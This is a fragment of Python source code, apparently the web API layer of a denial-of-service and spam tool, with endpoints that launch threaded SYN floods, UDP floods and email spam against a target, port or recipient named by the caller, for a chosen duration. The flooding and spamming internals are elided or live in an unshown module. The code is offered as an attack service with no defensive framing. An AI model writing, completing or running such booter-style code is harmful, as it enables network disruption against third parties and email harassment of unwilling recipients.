...
async def syn_flood(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            ...
            t.start()
        log.info(
            f"{target}:{port} SYN-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(
            f"{target}:{port} SYN-Flood from {request.client.host} for {time} seconds could not be triggered")
...
async def udp_flood(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            ...
            t.start()
        log.info(
            f"{target}:{port} UDP-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(
            f"{target}:{port} UDP-Flood from {request.client.host} for {time} seconds could not be triggered")
...
async def email_spam(time: int, receivermail: str, message: str, request: Request):
    try:
        t = Thread(target=Layer4.email_spam, args=(
            receivermail, time, message,))
        t.start()
        log.info(
            f"{receivermail} EMAIL-Spammed from {request.client.host} for {time} seconds")
    except Exception as e:
        print(e)
        log.warning(
            f"{receivermail} EMAIL-Spam from {request.client.host} for {time} seconds could not be triggered")
